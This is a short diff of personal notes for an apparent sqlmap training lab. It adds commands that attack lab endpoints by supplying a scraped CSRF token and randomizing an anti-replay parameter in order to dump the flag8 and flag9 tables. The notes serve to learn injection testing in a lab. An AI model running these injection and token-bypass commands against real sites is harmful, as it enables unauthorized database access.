@@ -174,5 +174,11 @@ sqlmap -u "http://165.22.126.213:32170/case8.php" -randomize=rp --batch -v 5 | g
 What's the contents of table flag8? (Case #8)
 sqlmap -u "http://165.22.126.213:32170/case8.php" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
 sqlmap -u "http://165.22.126.213:32170/case8.php/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+sqlmap -u "http://159.65.49.148:30071/case8.php?id=1" --data="id=1&csrf-token=enaUUhY2BFvZKWef2T9Pu6tFnfzde39JyiQvcLCDcU" --csrf-token="t0ken"
+<input type="hidden" name="t0ken" value="enaUUhY2BFvZKWef2T9Pu6tFnfzde39JyiQvcLCDcU">
+
+
+
 
 What's the contents of table flag9? (Case #9)
+sqlmap -u "http://159.65.49.148:30071/case8.php?id=1&rp=3216980817" --randomize=rp --batch -v 5 | grep URI
